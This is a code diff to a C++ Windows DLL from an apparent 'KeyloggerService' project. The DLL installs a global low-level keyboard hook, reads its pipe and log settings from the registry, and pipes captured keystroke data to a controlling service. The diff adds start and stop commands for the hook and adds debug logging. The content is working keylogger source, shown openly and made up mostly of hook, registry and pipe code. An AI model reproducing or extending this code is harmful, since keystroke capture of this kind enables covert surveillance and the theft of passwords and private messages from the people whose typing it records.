@@ -7,6 +7,7 @@
 #include <iostream>
 #include <AccCtrl.h>
 #include <AclAPI.h>
+#include <filesystem>
 
 HANDLE hEvent;
 HANDLE hThread;
@@ -19,25 +20,78 @@ HMODULE gModule;
 std::atomic<bool> stopFlag(false);
 std::atomic<bool> stopCallback(false);
 
+std::wstring appDataDir = L"";
+std::wstring logDir = L"";
+std::wstring dllPipe = L"";
+std::wstring servicePipe = L"";
+
+LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam);
+DWORD WINAPI createHookProcess(LPVOID lpParam);
+
+bool readStringValueFromRegistry(const std::wstring& subkey, const std::wstring& valueName, std::wstring& result) {
+    HKEY hKey;
+    LONG status = RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_READ, &hKey);
+    if (status != ERROR_SUCCESS) {
+        std::cerr << "RegOpenKeyExW failed. Error: " << status << std::endl;
+        return false;
+    }
+
+    DWORD dataType;
+    DWORD dataSize;
+    status = RegQueryValueExW(hKey, valueName.c_str(), NULL, &dataType, NULL, &dataSize);
+    if (status != ERROR_SUCCESS || dataType != REG_SZ) {
+        std::cerr << "RegQueryValueExW failed. Error: " << status << std::endl;
+        RegCloseKey(hKey);
+        return false;
+    }
+
+    result.resize(dataSize / sizeof(wchar_t));
+    status = RegQueryValueExW(hKey, valueName.c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(&result[0]), &dataSize);
+    if (status != ERROR_SUCCESS) {
+        std::cerr << "RegQueryValueExW failed. Error: " << status << std::endl;
+        RegCloseKey(hKey);
+        return false;
+    }
+
+    RegCloseKey(hKey);
+    return true;
+}
+
 void printToLog(std::string data, std::string filename = "!HookDll.log") {
-    std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\" + filename, std::ios_base::app);
+    //std::wofstream outFile(logDir + L"\\" + stringToWString(filename), std::ios_base::app);
+    std::wofstream outFile("C:\\ProgramData\\KeyloggerService\\Logs\\!HookDll.log", std::ios_base::app);
     if (outFile.is_open()) {
-        outFile << data << std::endl;
+        outFile << stringToWString(data) << std::endl;
     }
     outFile.close();
 }
 void Stop()
 {
-    stopFlag = true;
-    CancelIo(hPipe);
+    //stopFlag = true;
+    //CancelIo(hPipe);
     if (g_hHook)UnhookWindowsHookEx(g_hHook);
-    SetEvent(hEvent);
-    FreeLibrary(gModule);
+    if (!TerminateThread(hThread, 1))
+    {
+        printToLog("Failed to terminate thread : % lu\n");
+    }
+
+    // Закройте дескриптор потока
+    CloseHandle(hThread);
+    //SetEvent(hEvent);
+    //FreeLibrary(gModule);
+}
+
+void Start()
+{
+    hookThread = CreateThread(NULL, 0, createHookProcess, NULL, 0, NULL);
+    printToLog("Hook process created", "!DllMain.log");
+    if (hookThread != NULL) {
+        printToLog("Server thread started", "!DllMain.log");
+    }
 }
 
 DWORD WINAPI readCommandThread(LPVOID lpThreadParameter)
 {
-    std::wstring name = L"\\\\.\\pipe\\myreadpipe";
     SECURITY_ATTRIBUTES sa;
     DWORD dwRead = 1;
     DWORD error;
@@ -54,7 +108,7 @@ DWORD WINAPI readCommandThread(LPVOID lpThreadParameter)
 
     InitSecurityAttributes(&sa);
 
-    hPipe = CreateNamedPipe(name.c_str(), PIPE_ACCESS_DUPLEX, dwModeWait,
+    hPipe = CreateNamedPipe(dllPipe.c_str(), PIPE_ACCESS_DUPLEX, dwModeWait,
         PIPE_UNLIMITED_INSTANCES, PAGE_SIZE, PAGE_SIZE, INFINITE, &sa);
     if (hPipe == INVALID_HANDLE_VALUE)
     {
@@ -87,7 +141,10 @@ DWORD WINAPI readCommandThread(LPVOID lpThreadParameter)
                 ReadFile(hPipe, &data, sizeof(data), &dwRead, NULL);
 
                 if (std::string(data).find("stop") != std::string::npos) {
-                    goto _exit;
+                    Stop();
+                }
+                else if (std::string(data).find("start") != std::string::npos) {
+                    Start();
                 }
                 if (dwRead == 0)break;
                 error = GetLastError();
@@ -98,6 +155,7 @@ DWORD WINAPI readCommandThread(LPVOID lpThreadParameter)
             DisconnectNamedPipe(hPipe);
         }
         Sleep(100);
+        dwRead = 1;
     }
     printToLog("[*] Server stopped");
 
@@ -146,6 +204,7 @@ void sendData(int keyLayout, int nCode, WPARAM wParam, LPARAM lParam) {
     {
         printToLog("Failed write structure size to named pipe: " + std::to_string(GetLastError()), "!SendData.log");
     }
+    printToLog("Data sended to server", "!DllMain.log");
     //CloseHandle(writePipe);
 }
 
@@ -167,9 +226,9 @@ DWORD WINAPI createHookProcess(LPVOID lpParam)
 {
     g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, NULL, 0);
     MSG message;
-
     if (g_hHook != NULL)
     {
+        printToLog("SetWindowsHookEx created", "!DllMain.log");
         while (GetMessage(&message, NULL, 0, 0))
         {
             TranslateMessage(&message);
@@ -182,34 +241,52 @@ DWORD WINAPI createHookProcess(LPVOID lpParam)
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
 {
-
+    bool a, b, c, d;
+    std::wstring subkey;
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
+        printToLog("DLL_PROCESS_ATTACH started", "!DllMain.log");
+        //читаем конфиг из реестра 
+        subkey = L"Software\\KeyloggerService\\config";
+        a = readStringValueFromRegistry(subkey, L"logDir", logDir);
+        b = readStringValueFromRegistry(subkey, L"appDataDir", appDataDir);
+        c = readStringValueFromRegistry(subkey, L"dllPipe", dllPipe);
+        d = readStringValueFromRegistry(subkey, L"servicePipe", servicePipe);
+
+        if (!a || !b || !c || !d) {
+            printToLog("Failed to open named pipe: " + GetLastError(), "!DllMain.log");
+            return FALSE;
+        }
+        printToLog("Config red from registry", "!DllMain.log");
         // Создаем событие
         hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
         gModule = hModule;
         if (!writePipe) {
             writePipe = CreateFile(
-                L"\\\\.\\pipe\\mywritepipe",
+                servicePipe.c_str(),
                 GENERIC_WRITE,
                 0,
                 NULL,
                 OPEN_EXISTING,
                 0,
                 NULL);
-
+            printToLog("Pipe for conetion to Server created", "!DllMain.log");
             if (writePipe == INVALID_HANDLE_VALUE) {
                 printToLog("Failed to open named pipe: " + GetLastError(), "!DllMain.log");
             }
         }
 
         hookThread = CreateThread(NULL, 0, createHookProcess, NULL, 0, NULL);;
+        printToLog("Hook process created", "!DllMain.log");
         if (hookThread != NULL) {
             hThread = CreateThread(NULL, 0, readCommandThread, hEvent, 0, NULL);;
+            printToLog("Server thread started", "!DllMain.log");
             if (hThread == NULL)
             {
+                printToLog("Server thread not started", "!DllMain.log");
                 UnhookWindowsHookEx(g_hHook);
+                printToLog("Unhook", "!DllMain.log");
                 return FALSE;
             }
         }
